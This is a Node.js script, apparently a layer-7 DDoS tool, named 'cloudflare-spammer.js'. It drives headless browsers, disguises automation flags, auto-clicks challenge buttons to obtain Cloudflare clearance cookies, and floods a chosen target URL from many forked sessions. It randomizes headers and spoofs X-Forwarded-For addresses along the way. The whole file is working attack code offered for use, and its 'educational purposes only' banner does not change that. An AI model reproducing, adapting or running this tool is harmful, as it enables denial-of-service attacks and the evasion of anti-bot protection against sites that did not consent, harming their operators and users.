const { connect } = require("puppeteer-real-browser");
const cluster = require("cluster");
const url = require("url");

// Cấu hình tham số
if (process.argv.length < 5) {
    console.log("\x1b[31mUsage: node cloudflare-spammer.js <target> <time> <threads>\x1b[0m");
    console.log("\x1b[33mExample: node cloudflare-spammer.js https://example.com 60 4\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    threads: parseInt(process.argv[4])
};

// Biến toàn cục thống kê
global.stats = {
    totalRequests: 0,
    successRequests: 0,
    failedRequests: 0,
    bypassSessions: 0,
    activeSessions: 0,
    startTime: Date.now()
};

class CloudflareSpammer {
    constructor(sessionId) {
        this.sessionId = sessionId;
        this.browser = null;
        this.page = null;
        this.cookies = [];
        this.userAgent = "";
        this.isBypassed = false;
        this.isRunning = false;
        this.spamInterval = null;
        this.requestCount = 0;
    }

    // Khởi tạo trình duyệt
    async initBrowser(headless = true) {
        try {
            console.log(`\x1b[33m[Session ${this.sessionId}] Initializing browser...\x1b[0m`);
            
            const response = await connect({
                headless: headless,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--disable-gpu',
                    '--window-size=1920,1080',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--disable-blink-features=AutomationControlled'
                ],
                turnstile: true,
                connectOption: {
                    defaultViewport: null,
                    ignoreHTTPSErrors: true
                }
            });
            
            this.browser = response.browser;
            this.page = response.page;
            
            // Set random user agent
            const userAgents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36'
            ];
            
            await this.page.setUserAgent(userAgents[Math.floor(Math.random() * userAgents.length)]);
            
            // Stealth mode
            await this.page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
                Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
            });
            
            return true;
        } catch (error) {
            console.error(`\x1b[31m[Session ${this.sessionId}] Browser init failed: ${error.message}\x1b[0m`);
            return false;
        }
    }

    // Bypass Cloudflare
    async bypassCloudflare(attemptNum = 1) {
        try {
            console.log(`\x1b[33m[Session ${this.sessionId}] Bypass attempt ${attemptNum}...\x1b[0m`);
            
            // Navigate to target
            try {
                await this.page.goto(args.target, { 
                    waitUntil: 'domcontentloaded',
                    timeout: 60000,
                    referer: args.target
                });
            } catch (navError) {
                console.log(`\x1b[33m[Session ${this.sessionId}] Navigation warning: ${navError.message}\x1b[0m`);
            }
            
            console.log(`\x1b[33m[Session ${this.sessionId}] Checking for Cloudflare challenge...\x1b[0m`);
            
            let challengeCompleted = false;
            let checkCount = 0;
            const maxChecks = 60; // 30 giây tối đa
            
            while (!challengeCompleted && checkCount < maxChecks) {
                await new Promise(r => setTimeout(r, 500));
                
                try {
                    // Check for Cloudflare clearance cookie
                    const cookies = await this.page.cookies();
                    const cfClearance = cookies.find(c => c.name === "cf_clearance");
                    
                    if (cfClearance) {
                        console.log(`\x1b[32m[Session ${this.sessionId}] ✅ Cloudflare bypassed! Cookie found after ${(checkCount * 0.5).toFixed(1)}s\x1b[0m`);
                        challengeCompleted = true;
                        this.cookies = cookies;
                        break;
                    }
                    
                    // Check if challenge page still showing
                    challengeCompleted = await this.page.evaluate(() => {
                        const title = (document.title || "").toLowerCase();
                        const bodyText = (document.body?.innerText || "").toLowerCase();
                        
                        if (title.includes("just a moment") || 
                            title.includes("checking") ||
                            bodyText.includes("checking your browser") ||
                            bodyText.includes("please wait") ||
                            bodyText.includes("cloudflare") ||
                            bodyText.includes("ddos protection") ||
                            document.querySelector('#challenge-form, .challenge-form')) {
                            return false;
                        }
                        
                        return document.body && document.body.children.length > 3;
                    });
                    
                } catch (evalError) {
                    // Continue checking
                }
                
                checkCount++;
                
                // Auto-click nếu phát hiện challenge button
                if (checkCount % 5 === 0) {
                    try {
                        const hasButton = await this.page.evaluate(() => {
                            const button = document.querySelector('input[type="submit"], button');
                            if (button && (button.value?.toLowerCase().includes('verify') || 
                                          button.textContent?.toLowerCase().includes('verify'))) {
                                button.click();
                                return true;
                            }
                            return false;
                        });
                        
                        if (hasButton) {
                            console.log(`\x1b[33m[Session ${this.sessionId}] Clicked verify button\x1b[0m`);
                        }
                    } catch (e) {}
                }
            }
            
            // Lấy cookies và user agent
            this.cookies = await this.page.cookies();
            this.userAgent = await this.page.evaluate(() => navigator.userAgent);
            
            if (this.cookies.length > 0) {
                const cfClearance = this.cookies.find(c => c.name === "cf_clearance");
                if (cfClearance) {
                    console.log(`\x1b[32m[Session ${this.sessionId}] ✅ cf_clearance: ${cfClearance.value.substring(0, 30)}...\x1b[0m`);
                }
                console.log(`\x1b[36m[Session ${this.sessionId}] Obtained ${this.cookies.length} cookies\x1b[0m`);
                this.isBypassed = true;
                global.stats.bypassSessions++;
                return true;
            } else {
                console.log(`\x1b[33m[Session ${this.sessionId}] ⚠️ No cookies obtained, continuing anyway\x1b[0m`);
                this.isBypassed = false;
                return true; // Vẫn tiếp tục dù không có cookies
            }
            
        } catch (error) {
            console.error(`\x1b[31m[Session ${this.sessionId}] Bypass failed: ${error.message}\x1b[0m`);
            return false;
        }
    }

    // Spam request từ trình duyệt với rate 4rps
    async startSpam() {
        if (!this.page) {
            console.error(`\x1b[31m[Session ${this.sessionId}] No page available\x1b[0m`);
            return false;
        }
        
        console.log(`\x1b[32m[Session ${this.sessionId}] Starting spam (4rps)...\x1b[0m`);
        this.isRunning = true;
        global.stats.activeSessions++;
        
        // Chuyển cookies thành string
        const cookieString = this.cookies.map(c => `${c.name}=${c.value}`).join('; ');
        
        // Các headers ngẫu nhiên
        const headersList = [
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            },
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-GB,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Cache-Control': 'max-age=0'
            },
            {
                'Accept': '*/*',
                'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate',
                'Cache-Control': 'no-store'
            }
        ];
        
        // Spam với rate 4rps
        this.spamInterval = setInterval(async () => {
            if (!this.isRunning) return;
            
            try {
                // Gửi 4 request mỗi giây
                for (let i = 0; i < 4; i++) {
                    this.sendBrowserRequest(cookieString, headersList);
                    await new Promise(r => setTimeout(r, 250)); // 250ms giữa mỗi request
                }
            } catch (error) {
                global.stats.failedRequests++;
            }
        }, 1000);
        
        return true;
    }
    
    // Gửi request từ trình duyệt
    async sendBrowserRequest(cookieString, headersList) {
        try {
            const headers = headersList[Math.floor(Math.random() * headersList.length)];
            
            // Thêm các headers bổ sung ngẫu nhiên
            const extraHeaders = {};
            if (Math.random() > 0.5) {
                extraHeaders['X-Requested-With'] = 'XMLHttpRequest';
            }
            if (Math.random() > 0.7) {
                extraHeaders['X-Forwarded-For'] = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
            }
            
            await this.page.evaluate(async (url, cookie, baseHeaders, extraHeaders) => {
                try {
                    // Tạo headers kết hợp
                    const combinedHeaders = {
                        ...baseHeaders,
                        ...extraHeaders,
                        'Cookie': cookie
                    };
                    
                    // Thêm headers ngẫu nhiên
                    if (Math.random() > 0.8) {
                        combinedHeaders['X-Custom-Header'] = 'test-' + Math.random().toString(36).substr(2, 5);
                    }
                    
                    // Gửi request
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 10000);
                    
                    const response = await fetch(url, {
                        method: 'GET',
                        headers: combinedHeaders,
                        mode: 'cors',
                        credentials: 'include',
                        referrer: url,
                        referrerPolicy: 'no-referrer-when-downgrade',
                        signal: controller.signal
                    });
                    
                    clearTimeout(timeoutId);
                    
                    // Đọc một phần response để trigger completion
                    await response.text().catch(() => {});
                    
                    return response.status;
                } catch (fetchError) {
                    return 0;
                }
            }, args.target, cookieString, headers, extraHeaders);
            
            this.requestCount++;
            global.stats.totalRequests++;
            global.stats.successRequests++;
            
        } catch (error) {
            this.requestCount++;
            global.stats.totalRequests++;
            global.stats.failedRequests++;
            
            // Nếu lỗi nhiều, thử restart session
            if (this.requestCount % 100 === 0 && global.stats.failedRequests > global.stats.successRequests * 0.3) {
                console.log(`\x1b[33m[Session ${this.sessionId}] High failure rate, considering restart...\x1b[0m`);
            }
        }
    }
    
    // Dừng spam
    async stop() {
        this.isRunning = false;
        global.stats.activeSessions--;
        
        if (this.spamInterval) {
            clearInterval(this.spamInterval);
        }
        
        console.log(`\x1b[33m[Session ${this.sessionId}] Stopped. Sent ${this.requestCount} requests\x1b[0m`);
        
        try {
            if (this.page) await this.page.close();
            if (this.browser) await this.browser.close();
        } catch (error) {
            // Ignore cleanup errors
        }
    }
    
    // Chạy toàn bộ quy trình
    async run() {
        try {
            // Khởi tạo trình duyệt
            const initSuccess = await this.initBrowser(true);
            if (!initSuccess) {
                console.error(`\x1b[31m[Session ${this.sessionId}] Failed to initialize\x1b[0m`);
                return;
            }
            
            // Thử bypass Cloudflare
            const bypassSuccess = await this.bypassCloudflare(1);
            
            // Nếu bypass thất bại, thử lại 1 lần
            if (!bypassSuccess) {
                console.log(`\x1b[33m[Session ${this.sessionId}] Retrying bypass...\x1b[0m`);
                await this.bypassCloudflare(2);
            }
            
            // Bắt đầu spam bất kể bypass thành công hay không
            await this.startSpam();
            
        } catch (error) {
            console.error(`\x1b[31m[Session ${this.sessionId}] Run failed: ${error.message}\x1b[0m`);
        }
    }
}

// Hiển thị thống kê
function displayStats() {
    const elapsed = Math.floor((Date.now() - global.stats.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("\x1b[35m⚡ CLOUDFLARE BYPASS + BROWSER SPAMMER ⚡\x1b[0m");
    console.log("\x1b[33m⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️\x1b[0m\n");
    
    console.log(`\x1b[36mTarget:\x1b[0m ${args.target}`);
    console.log(`\x1b[36mTime:\x1b[0m ${elapsed}s / ${args.time}s (${remaining}s remaining)`);
    console.log(`\x1b[36mThreads:\x1b[0m ${args.threads} sessions`);
    console.log(`\x1b[36mRate:\x1b[0m 4 rps per session\n`);
    
    console.log("\x1b[33m📊 SESSION STATS:\x1b[0m");
    console.log(`   \x1b[32m✅ Bypassed:\x1b[0m ${global.stats.bypassSessions}`);
    console.log(`   \x1b[36m🔄 Active:\x1b[0m ${global.stats.activeSessions}/${args.threads}`);
    
    console.log("\n\x1b[33m📈 REQUEST STATS:\x1b[0m");
    console.log(`   \x1b[32m✅ Success:\x1b[0m ${global.stats.successRequests}`);
    console.log(`   \x1b[31m❌ Failed:\x1b[0m ${global.stats.failedRequests}`);
    console.log(`   \x1b[36m📊 Total:\x1b[0m ${global.stats.totalRequests}`);
    
    if (elapsed > 0) {
        const rps = global.stats.totalRequests / elapsed;
        console.log(`   \x1b[33m⚡ Speed:\x1b[0m ${rps.toFixed(2)} req/s`);
        console.log(`   \x1b[35m🎯 Estimated RPS:\x1b[0m ${(rps / args.threads).toFixed(2)} per session`);
        
        // Progress bar
        const progress = Math.min(100, (elapsed / args.time) * 100);
        const barWidth = 30;
        const filled = Math.floor(barWidth * progress / 100);
        const bar = '█'.repeat(filled) + '░'.repeat(barWidth - filled);
        console.log(`\n   \x1b[36m[${bar}] ${progress.toFixed(1)}%\x1b[0m`);
    }
    
    // Thông tin Cloudflare
    console.log(`\n\x1b[33m🛡️ CLOUDFLARE STATUS:\x1b[0m`);
    if (global.stats.bypassSessions > 0) {
        console.log(`   \x1b[32m✅ ${global.stats.bypassSessions} sessions bypassed protection\x1b[0m`);
    } else {
        console.log(`   \x1b[33m⚠️ No sessions bypassed, spamming raw\x1b[0m`);
    }
}

// Main execution
if (cluster.isMaster) {
    console.log("\x1b[35m⚡ CLOUDFLARE BYPASS + BROWSER SPAMMER ⚡\x1b[0m");
    console.log("\x1b[33m⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️\x1b[0m\n");
    console.log(`\x1b[36mTarget URL:\x1b[0m ${args.target}`);
    console.log(`\x1b[36mDuration:\x1b[0m ${args.time} seconds`);
    console.log(`\x1b[36mThreads:\x1b[0m ${args.threads} browser sessions`);
    console.log(`\x1b[36mRate:\x1b[0m 4 requests/second per session\n`);
    console.log("\x1b[32mStarting in 3 seconds...\x1b[0m");
    
    setTimeout(() => {
        // Fork workers
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork({
                SESSION_ID: i + 1
            });
            
            // Xử lý message từ worker
            worker.on('message', (msg) => {
                if (msg.type === 'stats') {
                    global.stats.totalRequests += msg.total || 0;
                    global.stats.successRequests += msg.success || 0;
                    global.stats.failedRequests += msg.failed || 0;
                    global.stats.bypassSessions += msg.bypassed ? 1 : 0;
                }
            });
        }
        
        // Hiển thị thống kê
        const statsInterval = setInterval(displayStats, 1000);
        
        // Dừng sau thời gian chỉ định
        setTimeout(() => {
            clearInterval(statsInterval);
            displayStats();
            
            console.log("\n\x1b[32m🎯 ATTACK COMPLETED!\x1b[0m");
            console.log("\x1b[36m📊 FINAL STATISTICS:\x1b[0m");
            console.log(`   Total Duration: ${args.time} seconds`);
            console.log(`   Total Requests: ${global.stats.totalRequests}`);
            console.log(`   Successful: ${global.stats.successRequests}`);
            console.log(`   Failed: ${global.stats.failedRequests}`);
            console.log(`   Success Rate: ${((global.stats.successRequests / global.stats.totalRequests) * 100 || 0).toFixed(2)}%`);
            console.log(`   Average RPS: ${(global.stats.totalRequests / args.time).toFixed(2)}`);
            console.log(`   Cloudflare Bypassed: ${global.stats.bypassSessions}/${args.threads} sessions`);
            
            // Kill tất cả workers
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
            
            setTimeout(() => process.exit(0), 2000);
            
        }, args.time * 1000);
        
        cluster.on('exit', (worker, code, signal) => {
            console.log(`\x1b[33mWorker ${worker.process.pid} exited\x1b[0m`);
        });
        
    }, 3000);
    
} else {
    // Worker process
    const sessionId = process.env.SESSION_ID || '1';
    const spammer = new CloudflareSpammer(sessionId);
    
    // Chạy spammer
    spammer.run();
    
    // Gửi stats về master
    setInterval(() => {
        process.send({
            type: 'stats',
            total: spammer.requestCount,
            success: spammer.requestCount - (spammer.requestCount * 0.1), // Ước lượng
            failed: spammer.requestCount * 0.1, // Ước lượng
            bypassed: spammer.isBypassed
        });
    }, 5000);
    
    // Dừng sau timeout
    setTimeout(async () => {
        await spammer.stop();
        process.exit(0);
    }, args.time * 1000);
}

// Error handling
process.on('uncaughtException', (err) => {
    console.error(`\x1b[31mUncaught Exception: ${err.message}\x1b[0m`);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(`\x1b[31mUnhandled Rejection at: ${promise}, reason: ${reason}\x1b[0m`);
});
